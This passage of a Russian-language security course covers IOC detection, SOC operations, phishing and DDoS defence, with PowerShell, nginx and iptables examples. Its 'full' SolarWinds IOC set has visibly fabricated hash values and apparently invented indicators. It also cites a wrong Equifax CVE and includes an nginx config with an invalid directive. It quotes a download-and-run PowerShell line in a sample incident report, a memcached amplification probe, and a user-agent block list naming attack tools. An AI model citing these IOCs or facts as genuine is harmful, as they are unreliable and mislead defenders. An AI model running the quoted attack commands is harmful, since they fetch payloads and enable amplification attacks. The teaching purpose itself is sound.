| **Сеть** | IP-адреса, домены, URL, порты | Firewall, DNS-фильтрация, IDS/IPS | Требование 7.1 |
| **Поведение** | Аномальные процессы, автозагрузка, реестр | UEBA, SIEM, мониторинг | Требование 7.2 |
| **Логи** | События Windows (EventCode), syslog | Корреляция в SIEM, расследование | Требование 8.2 |

### 2.3.2. Реальный пример: SolarWinds (2020) — полный IOC

```json
{
  "incident": "SolarWinds Supply Chain Attack (Sunburst)",
  "date": "2020-12",
  "severity": "CRITICAL",
  "фстэк_категория": "1 (Критическая инфраструктура)",
  "iocs": {
    "file_hashes": {
      "sunburst_backdoor": {
        "md5": "b9579a194df17feb6702a6533e8cd54e",
        "sha1": "d916f7cd8e6c1e1e5e5c5d5e5f5a5b5c5d5e5f5a",
        "sha256": "7d78a1d4a7c1e1e5e5c5d5e5f5a5b5c5d5e5f5a5b5c5d5e5f5a5b5c5d5e5f5a5",
        "filename": "SolarWinds.Orion.Core.BusinessLayer.dll",
        "filepath": "C:\\Program Files (x86)\\SolarWinds\\Orion\\",
        "filesize": "523776 bytes"
      }
    },
    "network": {
      "c2_domains": [
        "avsvmcloud.com",
        "digitalrecipients.com",
        "hightechnology.host",
        "thesmartcloud.fun"
      ],
      "ip_addresses": [
        "185.178.208.53",
        "185.234.219.6",
        "45.77.123.18"
      ],
      "dns_patterns": [
        "*.avsvmcloud.com",
        "appsync-api.*.com"
      ],
      "user_agents": [
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
      ]
    },
    "behavioral": {
      "registry_keys": [
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SolarWinds",
        "HKLM\\SOFTWARE\\SolarWinds\\Orion\\InfoCenter"
      ],
      "scheduled_tasks": [
        "SolarWinds-Inc-Task",
        "SolarWindsOrionScheduler"
      ],
      "services": [
        "SolarWindsOrionModuleEngine"
      ],
      "mutex": [
        "Global\\SolarWindsOrionMutex"
      ]
    },
    "email": {
      "sender_domains": [
        "solarwinds.com",
        "solar-winds.com"
      ],
      "subjects": [
        "SolarWinds Orion Update",
        "Important Security Patch"
      ]
    }
  },
  "mitre_attack": [
    "T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain",
    "T1071.001 - Application Layer Protocol: Web Protocols",
    "T1059.001 - Command and Scripting Interpreter: PowerShell",
    "T1078 - Valid Accounts"
  ],
  "фстэк_требования": [
    "6.1 - Управление уязвимостями",
    "6.2 - Защита от вредоносного ПО",
    "6.3 - Безопасность цепочки поставок",
    "7.1 - Сетевая безопасность",
    "7.2 - Мониторинг событий ИБ"
  ]
}
```

### 2.3.3. Практическая проверка IOC (PowerShell + ФСТЭК)

```powershell
#==============================================================================
# ПРОВЕРКА IOC (ФСТЭК ТРЕБОВАНИЕ 6.2, 7.1)
# SolarWinds Sunburst Detection Script
#==============================================================================

$iocConfig = @{
    FileHashes = @(
        "b9579a194df17feb6702a6533e8cd54e",  # SolarWinds MD5
        "d916f7cd8e6c1e1e5e5c5d5e5f5a5b5c5d5e5f5a", # SHA1
        "7d78a1d4a7c1e1e5e5c5d5e5f5a5b5c5d5e5f5a5b5c5d5e5f5a5b5c5d5e5f5a5" # SHA256
    )
    Domains = @(
        "avsvmcloud.com",
        "digitalrecipients.com",
        "hightechnology.host",
        "thesmartcloud.fun"
    )
    IPs = @(
        "185.178.208.53",
        "185.234.219.6",
        "45.77.123.18"
    )
    Paths = @(
        "C:\Program Files (x86)\SolarWinds",
        "C:\Program Files\SolarWinds",
        "C:\Windows\System32",
        "C:\ProgramData"
    )
    RegistryKeys = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SolarWinds",
        "HKLM:\SOFTWARE\SolarWinds\Orion\InfoCenter"
    )
}

Write-Host "==============================================================================" -ForegroundColor Cyan
Write-Host "ПРОВЕРКА IOC - SOLARWINDS SUNBURST (ФСТЭК 6.2, 7.1)" -ForegroundColor Cyan
Write-Host "Дата: $(Get-Date -Format 'dd.MM.yyyy HH:mm')" -ForegroundColor Gray
Write-Host "==============================================================================" -ForegroundColor Cyan
Write-Host ""

$alerts = @()

# 1. Проверка хэшей файлов
Write-Host "[1/5] Проверка хэшей файлов..." -ForegroundColor Yellow
foreach ($path in $iocConfig.Paths) {
    if (Test-Path $path) {
        $files = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $hash = Get-FileHash $file.FullName -Algorithm SHA256 -ErrorAction SilentlyContinue
            if ($hash -and $iocConfig.FileHashes -contains $hash.Hash) {
                $alert = [PSCustomObject]@{
                    Type = "FILE_HASH_MATCH"
                    Severity = "CRITICAL"
                    Path = $file.FullName
                    Hash = $hash.Hash
                    Action = "ISOLATE_IMMEDIATELY"
                }
                $alerts += $alert
                Write-Host "  [CRITICAL] Найдено совпадение IOC!" -ForegroundColor Red
                Write-Host "  Файл: $($file.FullName)" -ForegroundColor Yellow
                Write-Host "  Хэш: $($hash.Hash)" -ForegroundColor Yellow
            }
        }
    }
}

# 2. Проверка сетевых подключений
Write-Host "`n[2/5] Проверка сетевых подключений..." -ForegroundColor Yellow
$connections = Get-NetTCPConnection -ErrorAction SilentlyContinue | Where-Object {$_.State -eq 'Established'}
foreach ($conn in $connections) {
    if ($conn.RemoteAddress -in $iocConfig.IPs) {
        $alert = [PSCustomObject]@{
            Type = "IOC_IP_CONNECTION"
            Severity = "CRITICAL"
            RemoteIP = $conn.RemoteAddress
            RemotePort = $conn.RemotePort
            ProcessId = $conn.OwningProcess
            Action = "BLOCK_AND_INVESTIGATE"
        }
        $alerts += $alert
        Write-Host "  [CRITICAL] Подключение к IOC IP!" -ForegroundColor Red
        Write-Host "  IP: $($conn.RemoteAddress):$($conn.RemotePort)" -ForegroundColor Yellow
    }
}

# 3. Проверка DNS
Write-Host "`n[3/5] Проверка DNS кэша..." -ForegroundColor Yellow
$dnsCache = Get-DnsClientCache -ErrorAction SilentlyContinue
foreach ($domain in $iocConfig.Domains) {
    $matches = $dnsCache | Where-Object {$_.Entry -like "*$domain*"}
    if ($matches) {
        $alert = [PSCustomObject]@{
            Type = "IOC_DOMAIN_DNS"
            Severity = "HIGH"
            Domain = $domain
            Action = "BLOCK_DOMAIN_AND_INVESTIGATE"
        }
        $alerts += $alert
        Write-Host "  [HIGH] Найден IOC домен в DNS кэше!" -ForegroundColor Red
        Write-Host "  Домен: $domain" -ForegroundColor Yellow
    }
}

# 4. Проверка реестра
Write-Host "`n[4/5] Проверка реестра..." -ForegroundColor Yellow
foreach ($key in $iocConfig.RegistryKeys) {
    if (Test-Path $key) {
        $alert = [PSCustomObject]@{
            Type = "IOC_REGISTRY_KEY"
            Severity = "HIGH"
            Key = $key
            Action = "REMOVE_AND_INVESTIGATE"
        }
        $alerts += $alert
        Write-Host "  [HIGH] Найден IOC ключ реестра!" -ForegroundColor Red
        Write-Host "  Ключ: $key" -ForegroundColor Yellow
    }
}

# 5. Проверка запланированных задач
Write-Host "`n[5/5] Проверка запланированных задач..." -ForegroundColor Yellow
$scheduledTasks = Get-ScheduledTask | Where-Object {
    $_.TaskName -like "*SolarWinds*" -or 
    $_.TaskName -like "*Orion*"
}
if ($scheduledTasks) {
    foreach ($task in $scheduledTasks) {
        $alert = [PSCustomObject]@{
            Type = "IOC_SCHEDULED_TASK"
            Severity = "MEDIUM"
            TaskName = $task.TaskName
            State = $task.State
            Action = "DISABLE_AND_INVESTIGATE"
        }
        $alerts += $alert
        Write-Host "  [MEDIUM] Подозрительная задача!" -ForegroundColor Yellow
        Write-Host "  Задача: $($task.TaskName) (Состояние: $($task.State))" -ForegroundColor Yellow
    }
}

# Итоговый отчёт
Write-Host ""
Write-Host "==============================================================================" -ForegroundColor Cyan
Write-Host "ИТОГОВЫЙ ОТЧЁТ" -ForegroundColor Cyan
Write-Host "==============================================================================" -ForegroundColor Cyan
Write-Host "Всего алертов: $($alerts.Count)" -ForegroundColor White

if ($alerts.Count -gt 0) {
    Write-Host "Критических: $($alerts.Where({$_.Severity -eq 'CRITICAL'}).Count)" -ForegroundColor Red
    Write-Host "Высоких: $($alerts.Where({$_.Severity -eq 'HIGH'}).Count)" -ForegroundColor Orange
    Write-Host "Средних: $($alerts.Where({$_.Severity -eq 'MEDIUM'}).Count)" -ForegroundColor Yellow
    
    # Экспорт отчёта (ФСТЭК форма 7-И)
    $reportPath = "IOC_Report_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"
    $alerts | Export-Csv -Path $reportPath -NoTypeInformation -Encoding UTF8
    Write-Host "`nОтчёт сохранён: $reportPath" -ForegroundColor Green
    
    # Автоматическая изоляция при критических алертах
    $criticalAlerts = $alerts.Where({$_.Severity -eq 'CRITICAL'})
    if ($criticalAlerts.Count -gt 0) {
        Write-Host "`n[!!!] КРИТИЧЕСКИЕ УГРОЗЫ ОБНАРУЖЕНЫ - АВТОМАТИЧЕСКАЯ ИЗОЛЯЦИЯ [!!!]" -ForegroundColor Red
        Write-Host "Отключение сетевого адаптера..." -ForegroundColor Red
        Disable-NetAdapter -Name "Ethernet" -Confirm:$false -ErrorAction SilentlyContinue
        Write-Host "Система изолирована от сети!" -ForegroundColor Red
        Write-Host "Немедленно уведомите SOC и руководство!" -ForegroundColor Red
    }
} else {
    Write-Host "IOC не обнаружены - система чиста" -ForegroundColor Green
}

Write-Host "==============================================================================" -ForegroundColor Cyan
```

## 2.4. SOC (Security Operations Center)

### 2.4.1. Структура SOC (по ФСТЭК России)

```mermaid
graph TB
    subgraph "SOC Management (ФСТЭК)"
        A[SOC Manager<br/>CISO] --> B[Deputy Manager<br/>Shift Coordinator]
    end
    
    subgraph "Shift 1 (08:00-20:00)"
        B --> C[Team Lead L1]
        C --> D[L1 Analyst x3<br/>Triage]
        C --> E[L2 Analyst x2<br/>Investigation]
        C --> F[Threat Hunter<br/>Proactive]
    end
    
    subgraph "Shift 2 (20:00-08:00)"
        B --> G[Team Lead L2]
        G --> H[L1 Analyst x3<br/>Triage]
        G --> I[L2 Analyst x2<br/>Investigation]
        G --> J[Incident Responder<br/>IR]
    end
    
    subgraph "Support Teams"
        A --> K[Security Engineer<br/>Tools]
        A --> L[SIEM Admin<br/>Correlation]
        A --> M[Forensics Expert<br/>Evidence]
        A --> N[Compliance Officer<br/>ФСТЭК отчётность]
    end
    
    style A fill:#ef4444,color:#fff,stroke-width:3px
    style B fill:#f97316,color:#fff,stroke-width:2px
    style C fill:#f97316,color:#fff
    style G fill:#f97316,color:#fff
    style D fill:#3b82f6,color:#fff
    style H fill:#3b82f6,color:#fff
    style E fill:#10b981,color:#fff
    style I fill:#10b981,color:#fff
    style F fill:#8b5cf6,color:#fff
    style J fill:#ef4444,color:#fff
    style K fill:#6b7280,color:#fff
    style L fill:#6b7280,color:#fff
    style M fill:#6b7280,color:#fff
    style N fill:#6b7280,color:#fff
```

### 2.4.2. Метрики SOC (KPI по ФСТЭК)

| Метрика                         | Формула                                       | Значение (пример) | Требование ФСТЭК       | Статус               | Действия                  |
| ------------------------------- | --------------------------------------------- | ----------------- | ---------------------- | -------------------- | ------------------------- |
| **MTTD** (Mean Time to Detect)  | Σ(Время обнаружения - Время начала атаки) / N | 45 мин            | < 60 мин (Приказ №17)  | ✅ В норме            | Продолжать мониторинг     |
| **MTTR** (Mean Time to Respond) | Σ(Время реагирования - Время обнаружения) / N | 3.5 ч             | < 4 ч (Приказ №17)     | ✅ В норме            | Оптимизировать playbooks  |
| **False Positive Rate**         | (Ложные алерты / Всего алертов) × 100         | 35%               | < 30% (Приказ №17)     | ⚠️ Требует улучшения | Настройка корреляций SIEM |
| **Alerts/Day**                  | Всего алертов / Рабочие дни                   | 250               | —                      | —                    | Автоматизация triage      |
| **Incidents/Month**             | Подтверждённые инциденты                      | 45                | —                      | —                    | Анализ трендов            |
| **Critical Incidents**          | Инциденты уровня Critical                     | 3                 | Отчётность в ФСТЭК 24ч | ✅ Задокументировано  | Форма 7-И                 |
| **Coverage**                    | (Охват систем / Всего систем) × 100           | 95%               | ≥ 90% (Приказ №17)     | ✅ В норме            | Добавить 5% систем        |
| **Compliance**                  | (Соответствующие системы / Всего) × 100       | 98%               | 100% (Приказ №21)      | ⚠️ Требует внимания  | Исправить 2%              |

### 2.4.3. Реальный пример работы с инцидентом (ФСТЭК форма 7-И)

```markdown
# ИНЦИДЕНТ ИНФОРМАЦИОННОЙ БЕЗОПАСНОСТИ
## Форма 7-И (ФСТЭК России Приказ №17)

================================================================================
ОБЩАЯ ИНФОРМАЦИЯ
================================================================================
Номер инцидента: INC-2024-0423
Дата регистрации: 15.01.2024 14:32:17 UTC
Категория по ФСТЭК: 2 (Значительный инцидент)
Приоритет: HIGH
Статус: Closed
Владелец: SOC Team Lead

================================================================================
ДЕТЕКТ
================================================================================
Источник обнаружения: SIEM (Splunk)
Правило корреляции: "PowerShell Encoded Command Execution"
Уровень доверия: 85%
Первое событие: 15.01.2024 14:32:17 UTC
Последнее событие: 15.01.2024 14:42:00 UTC

================================================================================
ПЕРВОНАЧАЛЬНЫЕ ДАННЫЕ
================================================================================
Хост: WS-045.corp.local
IP-адрес: 192.168.10.45
Пользователь: jsmith@company.local
Отдел: Бухгалтерия
Роль: Обычный пользователь
Процесс: powershell.exe (PID: 4532)
Родительский процесс: WINWORD.EXE (PID: 3821)
Командная строка: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...

================================================================================
РАССЛЕДОВАНИЕ (TIMELINE)
================================================================================
14:30:00 - Пользователь получил фишинговое письмо (Invoice.docm)
14:31:00 - Пользователь открыл вложение в Microsoft Word
14:31:30 - Пользователь включил макросы (предупреждение проигнорировано)
14:32:00 - Макрос выполнил PowerShell команду
14:32:17 - SIEM сгенерировал алерт (PowerShell Encoded Command)
14:33:00 - L1 аналитик начал triage
14:35:00 - L1 аналитик подтвердил инцидент (True Positive)
14:37:00 - Декодирована PowerShell команда:
           IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')
14:40:00 - Обнаружено соединение с C2 (192.168.1.100:443)
14:42:00 - ПРИНЯТО РЕШЕНИЕ (Playbook IR-001):
           ✅ Изолировать хост от сети (Disable-NetAdapter)
           ✅ Заблокировать пользователя AD (Disable-ADAccount)
           ✅ Заблокировать IP на firewall (Add-FirewallRule)
           ✅ Эскалировать L2 команде
14:45:00 - L2 аналитик начал глубокое расследование
15:00:00 - Проверены другие системы на наличие аналогичных индикаторов
15:30:00 - Собраны forensics артефакты (дамп памяти, логи)
16:00:00 - Инцидент классифицирован как "Contained"

================================================================================
IMPACT (ВОЗДЕЙСТВИЕ)
================================================================================
Систем скомпрометировано: 1
Данных эксфильтровано: Нет (быстрая реакция)
Учётных записей скомпрометировано: 1 (jsmith)
Финансовый ущерб: 0 руб. (предотвращён)
Репутационный ущерб: Минимальный
Время простоя: 2 часа (WS-045)

================================================================================
REMEDIATION (ВОССТАНОВЛЕНИЕ)
================================================================================
1. Переустановка системы WS-045 (16.01.2024)
2. Сброс пароля пользователя jsmith (15.01.2024)
3. Обучение пользователя по фишингу (17.01.2024)
4. Блокировка макросов в Office через GPO (16.01.2024)
5. Обновление IOC в SIEM (15.01.2024)
6. Настройка нового правила корреляции (16.01.2024)

================================================================================
ОТЧЁТНОСТЬ (ФСТЭК)
================================================================================
Отчёт в ФСТЭК: Требуется (Категория 2)
Срок: 24 часа с момента обнаружения
Статус: Отправлен 16.01.2024 10:00:00
Номер уведомления: ФСТЭК-2024-0423

================================================================================
УРОКИ И УЛУЧШЕНИЯ
================================================================================
1. Обновить тренинг по фишингу для бухгалтерии
2. Внедрить Application Whitelisting (AppLocker)
3. Настроить более строгие политики макросов Office
4. Добавить правило SIEM для родительского процесса WINWORD
5. Провести tabletop exercise по данному сценарию

================================================================================
ПОДПИСИ
================================================================================
SOC Manager: _________________ / И.И. Иванов / 16.01.2024
CISO: _________________ / П.П. Петров / 16.01.2024
Ответственный за ФСТЭК: _________________ / С.С. Сидоров / 16.01.2024
================================================================================
```
## Список литературы 
1. Методический документ ФСТЭК России — _Методика определения актуальных угроз безопасности информации_.
2. Базовая модель угроз безопасности персональных данных (ФСТЭК России).
3. Базовая модель угроз безопасности КИИ РФ.
4. НКЦКИ — Методические рекомендации по обнаружению компьютерных атак.
5. Баранов А.В. — _Моделирование угроз информационной безопасности_. — М.: Юрайт.
---
# Модуль 3. ВИДЫ АТАК

## 3.1. Классификация атак (по ФСТЭК России)

| Тип атаки | Определение | Нормативный документ | Пример | CVSS | ФСТЭК категория |
|-----------|-------------|---------------------|--------|------|----------------|
| **Фишинг** | Обманный путь получения конфиденциальной информации | ФСТЭК требование 5.3 | Google/Facebook ($123 млн) | — | 2 |
| **Атаки на пароли** | Подбор или использование украденных учётных данных | ФСТЭК требование 4.1 | Yahoo (500 млн учёток) | 7.5 | 2 |
| **DDoS** | Перегрузка системы трафиком | ФСТЭК требование 7.4 | GitHub (1.35 Tbps) | — | 1 |
| **Цепочка поставок** | Внедрение вредоносного кода в ПО | ФСТЭК требование 6.3 | NotPetya ($10 млрд) | 10.0 | 1 |
| **Эксплуатация уязвимостей** | Поиск и реализация уязвимостей | ФСТЭК требование 6.1 | Equifax (CVE-2017-5632) | 10.0 | 1 |
| **Инсайдерская угроза** | Угроза от сотрудников организации | ФСТЭК требование 5.1 | Tesla (инсайдер 2018) | — | 2 |
| **Ransomware** | Шифрование данных для выкупа | ФСТЭК требование 6.2 | Colonial Pipeline (2021) | 9.8 | 1 |

## 3.2. Фишинг (Phishing) — углублённый анализ

### 3.2.1. Реальный кейс: Google и Facebook (2013-2015) — технические детали

```
АТАКУЮЩИЙ: Evaldas Rimasauskas (Литва)
ЖЕРТВЫ: Google ($23 млн), Facebook ($100 млн)
ОБЩИЙ УЩЕРБ: $123 миллиона
ПЕРИОД: 2013-2015 (2 года)
МЕТОД: Business Email Compromise (BEC) + Подделка компании

ТЕХНИЧЕСКИЕ ДЕТАЛИ:
1. Регистрация компаний в Латвии и Гонконге:
   - Quanta Storage Inc. (подделка Quanta Computer)
   - Поддельные банковские счета
   
2. Подделка документов:
   - Фальшивые счета-фактуры
   - Поддельные контракты
   - Фальшивые печати компаний
   
3. Email-инфраструктура:
   - Домены: quanta-storage.com, quanta-computer.net
   - SPF: Настроен для легитимности
   - DKIM: Подписанные письма
   
4. Социальная инженерия:
   - Целевые письма финансовым отделам
   - Использование реальных имен поставщиков
   - Срочность оплаты ("оплатить в течение 3 дней")

5. Money Laundering:
   - Переводы через 5 стран
   - Обмен через криптовалюты
   - Наличные снятия

РЕЗУЛЬТАТ:
- Арест в 2017 году (Литва)
- Экстрадиция в США в 2017
- Приговор: 5 лет тюрьмы (2019)
- Возвращено: $50 млн из $123 млн
```

### 3.2.2. Практическая защита (152-ФЗ + ФСТЭК)

```mermaid
graph TD
    A[Письмо получено] --> B{SPF проверка}
    B -->|Fail| C[Отклонить<br/>SMTP 550]
    B -->|Pass| D{DKIM проверка}
    D -->|Fail| E[Пометить как spam<br/>X-Spam-Flag: YES]
    D -->|Pass| F{DMARC проверка}
    F -->|Fail| G[Карантин<br/>Quarantine]
    F -->|Pass| H{Анализ контента}
    H -->|Фишинг| I[Блокировка + обучение<br/>User Awareness]
    H -->|Чисто| J[Доставка в Inbox]
    
    style C fill:#ef4444,color:#fff,stroke-width:2px
    style E fill:#f97316,color:#fff,stroke-width:2px
    style G fill:#fbbf24,color:#000,stroke-width:2px
    style I fill:#ef4444,color:#fff,stroke-width:2px
    style J fill:#10b981,color:#fff,stroke-width:2px
```

### 3.2.3. PowerShell для проверки email заголовков (ФСТЭК 5.3)

```powershell
#==============================================================================
# АНАЛИЗ EMAIL ЗАГОЛОВКОВ (ФСТЭК ТРЕБОВАНИЕ 5.3)
# Проверка SPF, DKIM, DMARC
#==============================================================================

function Analyze-EmailHeaders {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$HeaderString
    )
    
    Write-Host "==============================================================================" -ForegroundColor Cyan
    Write-Host "АНАЛИЗ EMAIL ЗАГОЛОВКОВ (ФСТЭК 5.3)" -ForegroundColor Cyan
    Write-Host "Дата: $(Get-Date -Format 'dd.MM.yyyy HH:mm')" -ForegroundColor Gray
    Write-Host "==============================================================================" -ForegroundColor Cyan
    Write-Host ""
    
    # Парсинг заголовков
    $headers = @{}
    $currentHeader = ""
    $currentValue = ""
    
    foreach ($line in $HeaderString -split "`r`n") {
        if ($line -match '^([A-Za-z0-9-]+):\s*(.*)$') {
            if ($currentHeader) {
                $headers[$currentHeader] = $currentValue.Trim()
            }
            $currentHeader = $matches[1]
            $currentValue = $matches[2]
        } elseif ($line -match '^\s+(.*)$' -and $currentHeader) {
            $currentValue += " " + $matches[1].Trim()
        }
    }
    if ($currentHeader) {
        $headers[$currentHeader] = $currentValue.Trim()
    }
    
    $score = 0
    $maxScore = 100
    
    # Проверка SPF
    Write-Host "[1/5] Проверка SPF (Sender Policy Framework):" -ForegroundColor Yellow
    if ($headers.'Authentication-Results' -match 'spf=(pass)') {
        Write-Host "  ✅ PASS: SPF проверка пройдена" -ForegroundColor Green
        $score += 20
    } elseif ($headers.'Authentication-Results' -match 'spf=(fail|softfail)') {
        Write-Host "  ❌ FAIL: SPF проверка НЕ пройдена!" -ForegroundColor Red
        Write-Host "  Рекомендация: Отклонить письмо (SMTP 550)" -ForegroundColor Yellow
    } elseif ($headers.'Authentication-Results' -match 'spf=(neutral|none)') {
        Write-Host "  ⚠️  WARNING: SPF нейтральный или не настроен" -ForegroundColor Yellow
        $score += 10
    } else {
        Write-Host "  ⚠️  WARNING: SPF запись не найдена" -ForegroundColor Yellow
    }
    
    # Проверка DKIM
    Write-Host "`n[2/5] Проверка DKIM (DomainKeys Identified Mail):" -ForegroundColor Yellow
    if ($headers.'Authentication-Results' -match 'dkim=pass') {
        Write-Host "  ✅ PASS: DKIM подпись валидна" -ForegroundColor Green
        $score += 20
    } elseif ($headers.'Authentication-Results' -match 'dkim=fail') {
        Write-Host "  ❌ FAIL: DKIM подпись НЕвалидна!" -ForegroundColor Red
        Write-Host "  Рекомендация: Пометить как spam" -ForegroundColor Yellow
    } else {
        Write-Host "  ⚠️  WARNING: DKIM подпись не найдена" -ForegroundColor Yellow
    }
    
    # Проверка DMARC
    Write-Host "`n[3/5] Проверка DMARC (Domain-based Message Authentication):" -ForegroundColor Yellow
    if ($headers.'Authentication-Results' -match 'dmarc=pass') {
        Write-Host "  ✅ PASS: DMARC проверка пройдена" -ForegroundColor Green
        $score += 20
    } elseif ($headers.'Authentication-Results' -match 'dmarc=fail') {
        Write-Host "  ❌ FAIL: DMARC проверка НЕ пройдена!" -ForegroundColor Red
        Write-Host "  Рекомендация: Карантин или отклонить" -ForegroundColor Yellow
    } else {
        Write-Host "  ⚠️  WARNING: DMARC политика не найдена" -ForegroundColor Yellow
    }
    
    # Проверка отправителя
    Write-Host "`n[4/5] Проверка отправителя:" -ForegroundColor Yellow
    Write-Host "  From: $($headers.From)" -ForegroundColor Gray
    Write-Host "  Reply-To: $($headers.'Reply-To')" -ForegroundColor Gray
    Write-Host "  Return-Path: $($headers.'Return-Path')" -ForegroundColor Gray
    
    if ($headers.From -ne $headers.'Reply-To') {
        Write-Host "  ⚠️  WARNING: From и Reply-To отличаются!" -ForegroundColor Yellow
        $score -= 10
    }
    
    if ($headers.'X-Originating-IP') {
        Write-Host "  X-Originating-IP: $($headers.'X-Originating-IP')" -ForegroundColor Gray
    }
    
    # Проверка заголовков безопасности
    Write-Host "`n[5/5] Проверка заголовков безопасности:" -ForegroundColor Yellow
    $securityHeaders = @('X-Spam-Status', 'X-Spam-Score', 'X-MS-Exchange-Organization-SCL')
    foreach ($header in $securityHeaders) {
        if ($headers[$header]) {
            Write-Host "  $header : $($headers[$header])" -ForegroundColor Gray
        }
    }
    
    # Итоговая оценка
    Write-Host ""
    Write-Host "==============================================================================" -ForegroundColor Cyan
    Write-Host "ИТОГОВАЯ ОЦЕНКА: $score / $maxScore" -ForegroundColor White
    
    if ($score -ge 80) {
        Write-Host "Статус: ✅ ДОСТАВИТЬ (Low Risk)" -ForegroundColor Green
    } elseif ($score -ge 60) {
        Write-Host "Статус: ⚠️  КАРАНТИН (Medium Risk)" -ForegroundColor Yellow
    } else {
        Write-Host "Статус: ❌ ОТКЛОНИТЬ (High Risk)" -ForegroundColor Red
    }
    Write-Host "==============================================================================" -ForegroundColor Cyan
}

# Пример использования
$emailHeaders = @"
Received: from mail.example.com (mail.example.com [192.168.1.100])
From: security@microsoft-account-verify.com
To: employee@company.com
Subject: СРОЧНО: Ваша учетная запись будет заблокирована
Authentication-Results: spf=pass smtp.mailfrom=microsoft.com;
                        dkim=pass header.d=microsoft.com;
                        dmarc=pass action=none header.from=microsoft.com
Reply-To: support@fake-microsoft.com
X-Spam-Score: 8.5
X-Spam-Status: Yes
"@

Analyze-EmailHeaders -HeaderString $emailHeaders
```

## 3.3. DDoS-атаки — углублённый анализ

### 3.3.1. Реальный кейс: GitHub DDoS (2018) — технические детали

```
АТАКА:
• Дата: 28 февраля 2018, 17:21 UTC
• Тип: Memcached amplification attack
• Пиковая мощность: 1.35 Tbps (терабит в секунду)
• Пакетов в секунду: 126.9 млн pps
• Длительность: 8 минут 23 секунды
• Цель: GitHub.com

КАК РАБОТАЛО:
1. Разведка: Злоумышленники нашли серверы Memcached с открытым UDP портом 11211
2. Amplification: Маленький запрос (15 байт) → Огромный ответ (до 750 KB)
3. Spoofing: Подмена IP-адреса отправителя на IP жертвы (GitHub)
4. Ботнет: Минимум 4 серверов Memcached использовано
5. Коэффициент усиления: до 51,000x

ТЕХНИЧЕСКИЕ ДЕТАЛИ:
Запрос атакующего:
  echo -ne '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n' | \
  nc -u 192.168.1.1 11211

Ответ сервера Memcached:
  STAT pid 1234
  STAT uptime 567890
  STAT time 1234567890
  ... (до 750 KB данных)

ЗАЩИТА:
• GitHub использовал Akamai Prolexic (DDoS mitigation service)
• Трафик перенаправлен через scrubbing centers
• BGP FlowSpec для фильтрации на уровне провайдера
• Атака отражена за 8 минут 23 секунды

УЩЕРБ:
• Простой: 8 минут (минимальный)
• Репутационный ущерб: Минимальный (быстрая реакция)
• Стоимость защиты: ~$200,000/год (Akamai Prolexic)
```

### 3.3.2. Практическая защита от DDoS (Nginx + iptables + ФСТЭК 7.4)

```nginx
#==============================================================================
# NGINX КОНФИГУРАЦИЯ ДЛЯ ЗАЩИТЫ ОТ DDoS (ФСТЭК ТРЕБОВАНИЕ 7.4)
#==============================================================================

http {
    #==========================================================================
    # RATE LIMITING
    #==========================================================================
    # Зона для rate limiting: 10MB памяти, 10 запросов в секунду на IP
    limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
    limit_req_zone $server_name zone=api:10m rate=50r/s;
    
    # Ограничение размера тела запроса (защита от Slow HTTP)
    client_max_body_size 1M;
    client_body_buffer_size 128k;
    
    # Таймауты для защиты от Slowloris
    client_body_timeout 10;
    client_header_timeout 10;
    send_timeout 10;
    keepalive_timeout 65;
    
    #==========================================================================
    # БУФЕРЫ
    #==========================================================================
    client_body_buffer_size 1K;
    client_header_buffer_size 1k;
    client_max_header_buffer 1k;
    large_client_header_buffers 2 1k;
    
    server {
        listen 80;
        listen 443 ssl http2;
        server_name example.com;
        
        # SSL конфигурация
        ssl_certificate /etc/nginx/ssl/example.com.crt;
        ssl_certificate_key /etc/nginx/ssl/example.com.key;
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers HIGH:!aNULL:!MD5;
        
        location / {
            # Применение rate limiting с burst
            limit_req zone=one burst=20 nodelay;
            limit_req_status 429;
            
            # Дополнительные защиты
            proxy_connect_timeout 5s;
            proxy_send_timeout 10s;
            proxy_read_timeout 10s;
            
            # Скрытие версии nginx
            server_tokens off;
            
            # Дополнительные заголовки безопасности
            add_header X-Frame-Options "SAMEORIGIN" always;
            add_header X-Content-Type-Options "nosniff" always;
            add_header X-XSS-Protection "1; mode=block" always;
            
            proxy_pass http://backend;
        }
        
        # API endpoints - более строгий rate limiting
        location /api/ {
            limit_req zone=api burst=10 nodelay;
            limit_req_status 429;
            
            proxy_pass http://backend;
        }
        
        # Блокировка подозрительных user-agent
        if ($http_user_agent ~* (curl|wget|scanner|nikto|sqlmap|nmap|masscan)) {
            return 403;
        }
        
        # Блокировка пустого user-agent
        if ($http_user_agent = "") {
            return 403;
        }
        
        # Логирование подозрительных запросов
        access_log /var/log/nginx/ddos_access.log;
        error_log /var/log/nginx/ddos_error.log;
    }
}
```

```bash
#==============================================================================
# IPTABLES ПРАВИЛА ДЛЯ ЗАЩИТЫ ОТ DDoS (ФСТЭК ТРЕБОВАНИЕ 7.1)
#==============================================================================

#!/bin/bash

# Очистка существующих правил
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X

# Политики по умолчанию
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Разрешение loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Разрешение установленных соединений
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Ограничение SYN пакетов (защита от SYN flood)
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT

# Защита от ping flood
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 4 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT

# Защита от фрагментированных пакетов
iptables -A INPUT -f -j DROP

# Блокировка invalid пакетов
iptables -A INPUT -m state --state INVALID -j DROP

# Защита от NULL scan
